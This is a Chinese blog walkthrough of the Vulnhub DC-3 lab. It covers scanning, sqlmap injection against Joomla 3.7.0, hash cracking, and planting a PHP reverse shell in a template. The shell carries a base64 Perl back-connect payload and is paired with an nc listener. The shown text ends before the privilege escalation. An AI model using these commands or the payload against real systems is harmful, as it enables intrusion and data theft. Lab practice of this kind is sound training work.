@@ -1,0 +1,1555 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="【Vulnhub靶机】DC-3(内核exp提权), 秋刀鱼-">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>【Vulnhub靶机】DC-3(内核exp提权) | 秋刀鱼-</title>
+    <link rel="icon" type="image/png" href="https://pic.imgdb.cn/item/650ea58ec458853aef09a148.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="秋刀鱼-" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/avatar.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">秋刀鱼-</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/avatar.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">秋刀鱼-</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">【Vulnhub靶机】DC-3(内核exp提权)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Vulnhub/">
+                                <span class="chip bg-color">Vulnhub</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                靶机
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-11-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><a target="_blank" rel="noopener" href="http://www.five86.com/downloads/DC-3-2.zip">DC-3靶场下载</a></p>
+<hr>
+<pre class=" language-shell"><code class="language-shell">DC-3MAC地址：00:0C:29:6B:E5:16
+</code></pre>
+<p>将kali跟DC-3放同一网段</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p><strong>主机扫描</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liver100day/article/details/117560828">arp-scan命令教程</a></p>
+<pre class=" language-shell"><code class="language-shell">arp-scan -l
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806104240671.png" alt="image-20230806104240671"></p>
+<hr>
+<p>可以用<code>netdiscover</code>     它是一个主动&#x2F;被动的ARP 侦查工具。使用Netdiscover工具可以在网络上扫描IP地址,检查在线主机或搜索为它们发送的ARP请求。</p>
+<pre class=" language-shell"><code class="language-shell">netdiscover -r 192.168.80.0/24
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806151734124.png" alt="image-20230806151734124"></p>
+<p><strong>端口扫描</strong></p>
+<pre class=" language-shell"><code class="language-shell">nmap -A -T4 -p-  192.168.80.134
+
+-A #全面扫描
+-T #扫描速度
+-p- #全端口扫描
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806105055273.png" alt="image-20230806105055273"></p>
+<p>发现80端口可用，用的是<code>Joomla</code>的<code>cms</code></p>
+<p>浏览器访问DC-3的 80端口，用<code>Wappalyzer</code>插件，也可以看出是<code>Joomla</code>的</p>
+<p><img src="/../../images/TargetTest/image-20230806105225785.png" alt="image-20230806105225785"></p>
+<p><strong>目录爆破</strong></p>
+<pre class=" language-shell"><code class="language-shell">dirsearch -u 192.168.80.134 -i 200
+
+ -u URL                      #  URL目标
+ -i                          #状态码
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806105738325.png" alt="image-20230806105738325"></p>
+<p>也可以用御剑后台扫描工具</p>
+<p><img src="/../../images/TargetTest/image-20230806150217952.png" alt="image-20230806150217952"></p>
+<p>也可以用nikto扫描 <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_54471074/article/details/128623767">Nikto</a></p>
+<pre class=" language-shell"><code class="language-shell">nikto -h 192.168.80.134
+</code></pre>
+<p><img src="/../../images/TargetTest/226bf3bc9212473d82eba5c7878f7dd4.png" alt="在这里插入图片描述"></p>
+<hr>
+<p>进入后台管理页面</p>
+<p><img src="/../../images/TargetTest/image-20230806105858097.png" alt="image-20230806105858097"></p>
+<p><img src="/../../images/TargetTest/image-20230806110107850.png" alt="image-20230806110107850"></p>
+<h4 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h4><p> <strong>joomscan</strong></p>
+<p>joomscan是一款开源的且针对joomla的扫描器，kali可以用命令<code>apt install joomscan</code>安装该工具。</p>
+<pre class=" language-shell"><code class="language-shell">joomscan -u 192.168.80.134
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806110340748.png" alt="image-20230806110340748"></p>
+<p>扫描出了cms的版本，还有一些目录跟后台登入界面，这在信息收集部分已经发现</p>
+<hr>
+<p><strong>searchsploit</strong></p>
+<p>searchsploit是一款kali自带的搜索漏洞信息的模块，可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/102806149">searchsploit漏洞查找工具使用指南</a></p>
+<blockquote>
+<p>searchsploit是一个基于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。</p>
+<p>Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，可以查找需要的渗透模块，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell"># 搜索 joomla 3.7.0版本的漏洞
+searchsploit joomla 3.7.0
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806110707060.png" alt="image-20230806110707060"></p>
+<p>发现有SQL注入漏洞和跨站脚本漏洞</p>
+<hr>
+<p>使用find命令找出<code>42033.txt</code>的位置</p>
+<pre class=" language-shell"><code class="language-shell">find / -name '42033.txt'
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806120618969.png" alt="image-20230806120618969"></p>
+<p>查看文件内容</p>
+<pre class=" language-shell"><code class="language-shell">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806120719667.png" alt="image-20230806120719667"></p>
+<p>给出了注入方法</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h5><ul>
+<li>列出所有数据库</li>
+</ul>
+<blockquote>
+<p>过程有点久，耐心等待。。。</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">sqlmap -u "http://192.168.80.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]  
+
+
+-dbs #检测站点有哪些数据库
+
+--level    #sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
+
+--risk   #执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806113607199.png" alt="image-20230806113607199"></p>
+<ul>
+<li>列出指定数据库的所有表</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">sqlmap -u "http://192.168.80.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb --tables 
+
+
+-D  #指定数据库，当数据库名含有特殊符号的时候，需要用引号包括起来
+
+--tables #列出表
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806113827830.png" alt="image-20230806113827830"></p>
+<ul>
+<li>列出指定库指定表的字段名</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">sqlmap -u "http://192.168.80.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T "#__users" --columns
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806115957141.png" alt="image-20230806115957141"></p>
+<ul>
+<li>获取用户名和密码</li>
+</ul>
+<pre class=" language-shell"><code class="language-shell">sqlmap -u "http://192.168.80.134/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent  -p list[fullordering] -D joomladb -T "#__users" -C username,password --dump
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806121051296.png" alt="image-20230806121051296"></p>
+<p>发现用户的密码做了加密</p>
+<h5 id="John工具密码爆破"><a href="#John工具密码爆破" class="headerlink" title="John工具密码爆破"></a><strong>John工具密码爆破</strong></h5><p>john  是一款大受欢迎的、免费的开源软件、基于字典的密码破解工具。</p>
+<p>利用John工具，对该密码进行爆破拆解，工具详细信息参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/blue_starry_sky/article/details/61206488">John介绍及常用命令使用说明</a></p>
+<p>先在桌面创建一个文件，将得到的用户密码的hash值复制进去并保存，使用john破解。</p>
+<p><img src="/../../images/TargetTest/image-20230806121152271.png" alt="image-20230806121152271"></p>
+<p><img src="/../../images/TargetTest/image-20230806121221027.png" alt="image-20230806121221027"></p>
+<p><img src="/../../images/TargetTest/image-20230806121336721.png" alt="image-20230806121336721"></p>
+<p>得到密码后，登录后台界面</p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>登陆后，就要开始寻找有没有可以getshell的地方，这类的cms肯定是有上传文件的地方，这里可以上传一个一句话木马，用蚁剑进行连接，也可以写一个php，反弹shell到我们的攻击机上，这边，经过寻找发现了有个templates的beez3的目录</p>
+<p><img src="/../../images/TargetTest/image-20230806122605242.png" alt="image-20230806122605242"></p>
+<p><img src="/../../images/TargetTest/image-20230806122701155.png" alt="image-20230806122701155"></p>
+<p><img src="/../../images/TargetTest/image-20230806122804702.png" alt="image-20230806122804702"></p>
+<p>创建一个文件</p>
+<p><img src="/../../images/TargetTest/image-20230806130117210.png" alt="image-20230806130117210"></p>
+<p>写入php反弹shell</p>
+<p><img src="/../../images/TargetTest/image-20230806125722663.png" alt="image-20230806125722663"></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">which</span><span class="token punctuation">(</span><span class="token variable">$pr</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">"which $pr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">?</span> <span class="token variable">$path</span> <span class="token punctuation">:</span> <span class="token variable">$pr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+            <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; elseif(function_exists(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; elseif(function_exists(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; elseif(@is_resource($f = @popen($cfe,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token variable">$res</span> <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token keyword">function</span> <span class="token function">cf</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+@<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token variable">$yourip</span> <span class="token operator">=</span> <span class="token string">"your IP"</span><span class="token punctuation">;</span>
+<span class="token variable">$yourport</span> <span class="token operator">=</span> <span class="token string">'your port'</span><span class="token punctuation">;</span>
+<span class="token variable">$usedb</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'perl'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$back_connect</span><span class="token operator">=</span><span class="token string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token punctuation">.</span>
+<span class="token string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token punctuation">.</span>
+<span class="token string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token punctuation">.</span>
+<span class="token string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token punctuation">.</span>
+<span class="token string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token punctuation">.</span>
+<span class="token string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token punctuation">.</span>
+<span class="token string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span>
+<span class="token function">cf</span><span class="token punctuation">(</span><span class="token string">'/tmp/.bc'</span><span class="token punctuation">,</span><span class="token variable">$back_connect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" /tmp/.bc $yourip $yourport &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span> 
+</code></pre>
+<p>保存就上传好啦，再根据joomla的特性，模块会单独放在一个文件夹里&#x2F;templates&#x2F;，而beez3模块就在&#x2F;templates&#x2F;beez3&#x2F;里面，刚才创建的shell路径为</p>
+<pre class=" language-shell"><code class="language-shell">http://192.168.80.134/templates/beez3/shell.php
+</code></pre>
+<p>用kali来监听</p>
+<pre class=" language-shell"><code class="language-shell">nc -lvvp 4444
+</code></pre>
+<p><img src="/../../images/TargetTest/image-20230806124347455.png" alt="image-20230806124347455"></p>
+<p>浏览器访问shell.php的地址<code>http://192.168.80.134/templates/beez3/shell.php</code></p>
